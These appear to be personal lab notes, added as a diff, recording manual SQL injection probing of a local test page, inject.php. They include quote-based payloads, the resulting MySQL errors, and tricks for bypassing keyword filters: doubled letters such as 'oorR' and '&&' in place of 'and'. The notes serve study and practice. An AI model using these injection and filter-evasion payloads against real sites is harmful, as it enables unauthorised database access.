@@ -1,0 +1,16 @@
+1.http://192.168.1.20/inject.php?id=admin'
+语法错误：You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''admin''' at line 1
+
+2.http://192.168.1.20/inject.php?id=admin''
+页面显示:SELECT ID,Sex FROM injection WHERE NAME = 'admin''';
+
+3.当输入为偶数'时，就不会爆语法错误，反之会爆。
+
+4.http://192.168.1.20/inject.php?id=admin'' and 1=1
+and or 系列会直接被拦住。
+
+5.oR拦截 oorR放行同理and拦截
+
+6.and用&，&&替换，放行 
+		
+
